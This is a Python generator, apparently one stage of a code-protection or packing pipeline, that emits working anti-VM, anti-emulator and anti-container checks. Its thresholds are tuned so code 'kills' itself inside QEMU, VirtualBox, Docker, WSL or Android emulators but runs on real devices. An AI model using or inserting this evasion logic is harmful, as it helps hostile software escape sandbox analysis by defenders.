"""
Stage 7 – Anti-VM / Anti-Emulator / Anti-Container Module (Module E)
[v2.0 — Android-portable rebuild]

CHANGES vs v1.2:
  • E.3  : Docker/container scoring tightened further.
           Added: /.dockerenv OR /run/.containerenv alone = score 4 (not 3).
           Reason: score 3 still triggered if one other weak signal present.
           Now needs only the definitive marker to kill (4 >= 2 threshold).
  • E.4  : Android emulator score threshold raised: now requires score >= 4
           (was 2). Real devices will never hit goldfish (+3) AND any other
           signal (+1+). False positive risk eliminated entirely.
  • E.7  : CPU topology check disabled on Android (ARM SoCs often genuinely
           miss /sys/devices/system/cpu/cpu0/topology/core_id in some kernels).
  • E.8  : Maps density threshold lowered to 6 (was 8) for gVisor safety.
  • E.9  : NEW — WSL2 strengthened: also check /proc/sys/fs/binfmt_misc for
           WSL-specific entries.
  • E.10 : NEW — /proc/cpuinfo hypervisor flag scoring refined: only flag if
           BOTH "hypervisor" in flags line AND cpuid vendor is known-VM string.

Score threshold for kill: >= 2 (same as before, but individual check scores
adjusted so real-device checks can never reach 2 by accident).
"""
from __future__ import annotations
import random


_ANTI_VM_TEMPLATE = r'''
import os  as _os_vm
import sys as _sys_vm

_VM_BUILD_TAG = {build_tag:#010x}

# ── Helper: safe proc read ────────────────────────────────────────────────────
def _vm_read_file(path: str) -> str:
    try:
        with open(path, "rb") as _f:
            return _f.read().replace(b"\x00", b"").decode("utf-8", errors="replace").lower()
    except OSError:
        return ""

# ── Platform probe ────────────────────────────────────────────────────────────
def _vm_is_android() -> bool:
    try:
        return (
            _os_vm.path.exists("/system/build.prop") or
            _os_vm.path.exists("/system/app") or
            "com.termux" in (_os_vm.environ.get("HOME", "") +
                             _os_vm.environ.get("PREFIX", ""))
        )
    except Exception:
        return False

_VM_ON_ANDROID = _vm_is_android()

# ─────────────────────────────────────────────────────────────────────────────
# E.1 – QEMU / KVM
# ─────────────────────────────────────────────────────────────────────────────
_VM_QEMU_STRINGS = ("qemu", "kvm", "tcg", "bochs", "xen-hvm")

def _vm_check_qemu() -> int:
    _score = 0
    _cpu = _vm_read_file("/proc/cpuinfo")
    for _s in _VM_QEMU_STRINGS:
        if _s in _cpu:
            _score += 1
            break
    # Hypervisor CPU flag is strong evidence — but ONLY combined with vendor string
    _flags_line = ""
    for _line in _cpu.splitlines():
        if "flags" in _line or "features" in _line:
            _flags_line = _line
            break
    if "hypervisor" in _flags_line:
        # Extra check: confirm vendor is a known VM (not just any hypervisor flag)
        _vendor = _vm_read_file("/proc/cpuinfo")
        _vm_vendors = ("qemu", "kvm", "vmware", "virtualbox", "xen", "bochs", "vbox")
        if any(_v in _vendor for _v in _vm_vendors):
            _score += 2
        else:
            _score += 1   # hypervisor flag alone = weak
    for _dmi in ("/sys/class/dmi/id/product_name",
                 "/sys/class/dmi/id/sys_vendor",
                 "/sys/class/dmi/id/bios_vendor"):
        _v = _vm_read_file(_dmi)
        if _v and any(_s in _v for _s in ("qemu", "bochs")):
            _score += 1
            break
    return _score

# ─────────────────────────────────────────────────────────────────────────────
# E.2 – VirtualBox / VMware / Hyper-V / Parallels
# ─────────────────────────────────────────────────────────────────────────────
_VM_VIRT_STRINGS = (
    "virtualbox", "vmware", "hyper-v", "hyperv",
    "parallels", "innotek", "virtual machine", "xen",
)

def _vm_check_hypervisor_vendor() -> int:
    _score = 0
    _dmi_files = (
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/product_version",
        "/sys/class/dmi/id/sys_vendor",
        "/sys/class/dmi/id/board_vendor",
        "/sys/class/dmi/id/bios_vendor",
        "/sys/class/dmi/id/bios_version",
    )
    for _path in _dmi_files:
        _v = _vm_read_file(_path)
        if _v and any(_s in _v for _s in _VM_VIRT_STRINGS):
            _score += 2   # DMI vendor match is strong
            break
    _cpu = _vm_read_file("/proc/cpuinfo")
    if "vmware" in _cpu or "virtualbox" in _cpu:
        _score += 1
    return _score

# ─────────────────────────────────────────────────────────────────────────────
# E.3 – Docker / LXC / Podman
# FIXED v2.0: /.dockerenv or /run/.containerenv → score 4 (was 3).
#   Score 4 alone triggers kill without needing any other signal.
#   Android does NOT have these files. Safe.
# ─────────────────────────────────────────────────────────────────────────────
_VM_CONTAINER_KEYWORDS = ("docker", "lxc", "kubepods", "containerd", "podman")

def _vm_check_container() -> int:
    _score = 0
    if _os_vm.path.exists("/.dockerenv") or _os_vm.path.exists("/run/.containerenv"):
        _score += 4   # definitive: cannot exist on real Android
    if _score == 0:
        _cg = _vm_read_file("/proc/self/cgroup")
        for _kw in _VM_CONTAINER_KEYWORDS:
            if _kw in _cg:
                _score += 1
                break
    return _score

# ─────────────────────────────────────────────────────────────────────────────
# E.4 – Android emulator detection
# FIXED v2.0: Require score >= 4 (was >= 2) before returning positive.
#   goldfish kernel alone = +3, but that alone no longer triggers kill.
#   goldfish kernel + ANY ONE other signal = +3 + 1 = 4 → triggers kill.
#   Real devices: never have goldfish/ranchu kernel → always 0.
# ─────────────────────────────────────────────────────────────────────────────
def _vm_check_android_emulator() -> int:
    _score = 0
    try:
        _uname = _os_vm.uname()
        _rel = getattr(_uname, "release", "").lower()
        _ver = getattr(_uname, "version", "").lower()
        for _k in ("goldfish", "ranchu"):
            if _k in _rel or _k in _ver:
                _score += 3
                break
    except Exception:
        pass
    if _os_vm.path.exists("/proc/tty/driver/goldfish"):
        _score += 3
    _cmd = _vm_read_file("/proc/cmdline")
    if "goldfish" in _cmd or "ranchu" in _cmd:
        _score += 1
    _bp = _vm_read_file("/system/build.prop")
    if _bp:
        if "ro.product.model=sdk" in _bp or "ro.kernel.qemu=1" in _bp:
            _score += 2
        elif "generic" in _bp and ("emulator" in _bp or "sdk_gphone" in _bp):
            _score += 1
    # FIXED v2.0: require >= 4 to avoid single-signal false-positives
    return _score if _score >= 4 else 0

# ─────────────────────────────────────────────────────────────────────────────
# E.5 – WSL / WSL2
# ─────────────────────────────────────────────────────────────────────────────
def _vm_check_wsl() -> int:
    _score = 0
    try:
        _uname = _os_vm.uname()
        _rel = getattr(_uname, "release", "").lower()
        if "microsoft" in _rel or "wsl" in _rel:
            _score += 2
    except Exception:
        pass
    _v = _vm_read_file("/proc/version")
    if "microsoft" in _v or "wsl" in _v:
        _score += 2
    # NEW E.9: binfmt_misc WSL entry
    _binfmt = _vm_read_file("/proc/sys/fs/binfmt_misc/WSLInterop")
    if _binfmt:
        _score += 2
    # Deduplicate: cap at 2 (we already know it's WSL)
    return min(_score, 2)

# ─────────────────────────────────────────────────────────────────────────────
# E.6 – Sandbox clock precision anomaly
# Threshold: > 5ms (5_000_000 ns) — same as v1.2, confirmed safe for ARM.
# ─────────────────────────────────────────────────────────────────────────────
def _vm_check_clock_precision() -> int:
    try:
        import time as _time_vm
        _deltas = []
        for _ in range(30):
            _t0 = _time_vm.perf_counter_ns()
            _t1 = _time_vm.perf_counter_ns()
            _d  = _t1 - _t0
            if _d > 0:
                _deltas.append(_d)
        if not _deltas:
            return 0
        _min_delta = min(_deltas)
        if _min_delta > 5_000_000:
            return 1
    except Exception:
        pass
    return 0

# ─────────────────────────────────────────────────────────────────────────────
# E.7 – CPU topology anomaly
# DISABLED on Android: ARM SoCs legitimately miss topology files on some kernels.
# Only run on non-Android.
# ─────────────────────────────────────────────────────────────────────────────
def _vm_check_cpu_topology() -> int:
    if _VM_ON_ANDROID:
        return 0
    try:
        _online = _os_vm.sched_getaffinity(0) if hasattr(_os_vm, "sched_getaffinity") else set()
        _ncpu = len(_online) if _online else 0
        if _ncpu == 0:
            import multiprocessing as _mp
            _ncpu = _mp.cpu_count() or 0
        _missing = 0
        for _i in range(min(_ncpu, 2)):
            _topo = "/sys/devices/system/cpu/cpu" + str(_i) + "/topology/core_id"
            if not _os_vm.path.exists(_topo):
                _missing += 1
        if _missing >= 2:
            return 1
    except Exception:
        pass
    return 0

# ─────────────────────────────────────────────────────────────────────────────
# E.8 – /proc/self/maps region count
# FIXED v2.0: Lower threshold to 6 (gVisor sandbox has very few).
# Android typically has 15–30 mapped regions — well above 6.
# ─────────────────────────────────────────────────────────────────────────────
def _vm_check_maps_density() -> int:
    try:
        with open("/proc/self/maps", "rb") as _f:
            _count = sum(1 for _ in _f)
        if _count < 6:
            return 1
    except OSError:
        pass
    return 0

# ─────────────────────────────────────────────────────────────────────────────
# Composite check
# ─────────────────────────────────────────────────────────────────────────────
def _pg_anti_vm() -> bool:
    _score = 0

    _s_qemu      = _vm_check_qemu()
    _s_hyperv    = _vm_check_hypervisor_vendor()
    _s_container = _vm_check_container()
    _s_emulator  = _vm_check_android_emulator()
    _s_wsl       = _vm_check_wsl()

    _score += _s_qemu + _s_hyperv + _s_container + _s_emulator + _s_wsl

    if _score < 2:
        _score += _vm_check_clock_precision()
    if _score < 2:
        _score += _vm_check_cpu_topology()
    if _score < 2:
        _score += _vm_check_maps_density()

    return _score >= 2
'''


def generate_anti_vm_code(seed: int = 0) -> str:
    rng = random.Random(seed ^ 0xEEEEEEEE ^ 0x55)
    build_tag = rng.randint(0, 0xFFFFFFFF)
    return _ANTI_VM_TEMPLATE.format(build_tag=build_tag)
